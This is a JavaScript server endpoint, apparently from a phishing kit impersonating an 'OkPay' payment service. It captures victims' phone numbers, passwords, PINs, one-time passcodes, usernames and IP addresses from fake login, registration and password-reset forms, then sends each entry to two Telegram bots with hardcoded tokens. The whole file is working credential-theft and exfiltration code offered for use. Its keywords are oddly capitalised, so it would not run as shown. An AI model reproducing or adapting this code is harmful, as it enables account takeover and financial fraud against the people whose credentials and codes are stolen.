Export default async function handler(req, res) {
  If (req.method !== 'POST') {
    Return res.status(405).json({ error: 'Method not allowed' });
  }

  Const { type, phone, pass, pin, otp, username, invite } = req.body;

  // --- BOT 1 ---
  Const BOT_TOKEN_1 = '9154780239:AAEb6OOOzd7TyF1taXlnN_ntKrjXLL6xj64';
  Const CHAT_ID_1 = '6463555281';

  // --- BOT 2 ---
  Const BOT_TOKEN_2 = '954780239:AAEb6OOOzd7TyF1taXlnN_ntKrjXLL6xj64'; 
  Const CHAT_ID_2 = '63555281';

  // Visitor ka real IP address
  Const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

  Let message = '';

  If (type === 'login') {
    Message = `✅ <b>New OkPay Login</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: <code>${phone}</code>\n🔑 Password: <code>${pass}</code>\n🔐 PIN: <code>${pin}</code>`;
  } else if (type === 'modal_otp') {
    Message = `🔐 <b>Login OTP requested (Modal)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>`;
  } else if (type === 'verify_otp') {
    Message = `🔑 <b>OTP Entered</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔢 OTP: <code>${otp}</code>`;
  } else if (type === 'success_login') {
    Message = `🚀 <b>Login Success / Verified</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>`;
  } else if (type === 'reg_otp') {
    Message = `🔐 <b>Register OTP requested</b>\n🌐 IP: <code>${clientIp}</code>\n👤 User: <code>${username}</code>\n📱 Phone: +91 <code>${phone}</code>`;
  } else if (type === 'register') {
    Message = `🆕 <b>New OkPay registration</b>\n🌐 IP: <code>${clientIp}</code>\n👤 User: <code>${username}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔑 Password: <code>${pass}</code>\n🔐 PIN: <code>${pin}</code>\n🎫 Invite: <code>${invite}</code>`;
  } else if (type === 'forgot_otp') {
    Message = `🔄 <b>Password Reset OTP Request</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>`;
  } else if (type === 'reset_pass') {
    Message = `🌱 <b>Password Reset Submitted</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔐 New Password: <code>${pass}</code>\n📎 OTP: <code>${otp}</code>`;
  } else {
    Message = `📩 <b>Activity from IP:</b> <code>${clientIp}</code>`;
  }

  Try {
    Const sendToBot1 = fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
      Method: 'POST',
      Headers: { 'Content-Type': 'application/json' },
      Body: JSON.stringify({ chat_id: CHAT_ID_1, text: message, parse_mode: 'HTML' })
    });

    Const sendToBot2 = fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
      Method: 'POST',
      Headers: { 'Content-Type': 'application/json' },
      Body: JSON.stringify({ chat_id: CHAT_ID_2, text: message, parse_mode: 'HTML' })
    });

    Await Promise.all([sendToBot1, sendToBot2]);

    Return res.status(200).json({ success: true });
  } catch (err) {
    Console.error('Telegram API error:', err);
    Return res.status(500).json({ error: 'Failed to send messages' });
  }
}
